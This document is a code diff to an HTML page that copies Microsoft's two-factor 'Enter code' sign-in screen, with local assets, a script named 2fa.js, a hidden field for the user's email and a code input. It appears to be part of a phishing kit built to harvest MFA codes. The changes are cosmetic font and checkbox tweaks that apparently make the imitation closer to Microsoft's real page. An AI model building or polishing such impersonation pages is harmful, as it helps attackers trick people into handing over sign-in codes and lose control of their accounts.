@@ -20,7 +20,7 @@
 			<img src="./images/microsoft_logo.svg" alt="" class="mb-3" />
 
 			<form id="code-form" class="relative flex flex-col">
-				<span class="text-sm m-grey hidden" id="user-email"></span>
+				<span class="text-base m-grey hidden" id="user-email"></span>
 				<h1 class="mt-2 mb-2 text-2xl font-semibold" style="color: #1b1b1b; font-size: 22px">Enter code</h1>
 				<div class="flex mb-2">
 					<img
@@ -31,15 +31,15 @@
 						data-bind="imgSrc, css: { 'small': small }"
 						src="https://logincdn.msftauth.net/shared/1.0/content/images/picker_verify_code_b41922ebdaebec16b19999fc6054a15a.svg"
 					/>
-					<p class="text-sm opacity-80 grey">Enter the code displayed in the Microsoft app (such as Authenticator or Outlook) you use for approving sign-in requests.</p>
+					<p class="opacity-80 grey" style="font-size: 15px">Enter the code displayed in the Microsoft app (such as Authenticator or Outlook) you use for approving sign-in requests.</p>
 				</div>
 				<p class="text-red-500 leading-5 hidden text-sm" id="error-msg"></p>
 
 				<input type="text" name="" id="code-input" placeholder="Code" class="outline-none border-b w-full pb-1 my-1 border-gray-600 text-sm focus:border-blue-800 placeholder-gray-500" />
 
-				<label class="my-2 text-sm flex gap-2 cursor-pointer">
-					<input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.Du }" name="AddTD" aria-label="Don't ask me again on this device" checked />
-					<span class="m-grey">Don't ask me again on this device</span>
+				<label class="my-2 flex gap-2 cursor-pointer items-center">
+					<input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" class="accent-blue-600" name="AddTD" aria-label="Don't ask me again on this device" checked />
+					<span class="m-grey" style="font-size: 15px">Don't ask me again on this device</span>
 				</label>
 				<p class="my-2 text-sm m-grey">Having trouble? <a href="#" class="blue-link"> Sign in another way</a></p>
 
@@ -68,5 +68,5 @@
 		</footer>
 	</body>
 
-	<script src="./script/2fa.js?new=t2"></script>
+	<script src="./script/2fa.js?new=t3"></script>
 </html>
